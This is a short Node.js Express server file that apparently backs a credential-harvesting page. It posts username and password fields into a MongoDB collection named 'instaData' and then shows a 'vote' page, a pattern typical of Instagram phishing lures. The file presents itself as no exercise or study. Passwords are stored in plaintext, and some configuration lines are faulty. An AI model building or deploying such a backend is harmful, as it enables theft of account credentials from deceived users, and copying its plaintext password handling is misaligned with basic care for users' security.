const express = require('express');
const path = require('path')
const bodyparser = require('body-parser');
const mongoose = require('mongoose');
const app = express();
const port = 80;


mongoose.set('strictQuery', true);
main().catch(err => console.log(err));

async function main() {
  await mongoose.connect('mongodb://127.0.0.1:27017/instaData');}

  const instaSchema = new mongoose.Schema({
    username : String,
    password : String
  });

  const user = mongoose.model('user', instaSchema);

app.use('/static', express.static('static'));
app.use(express.urlencoded());

app.engine('html', require('ejs').renderFile);
app.set('views engine', 'html');
app.set('views', path.join(__dirname, 'views'));

//ENDPOINTS 
app.get('/', (req, res)=>{
    
    const params = {}
res.status(200).render('index.html',params); 
});
app.get('/vote', (req, res)=>{
    
    const params = {}
res.status(200).render('vote.html',params); 
});

app.post('/', (req, res)=>{
    var myData = new user(req.body);
    myData.save().then(()=>{
      res.status(200).render('vote.html');
    }).catch(()=>{
      res.status(400).send("Item was not saved to the database")
    });
});


// START THE SERVER 
app.listen(port, ()=>{
    console.log(`The application started successfully on port ${port}`)
});
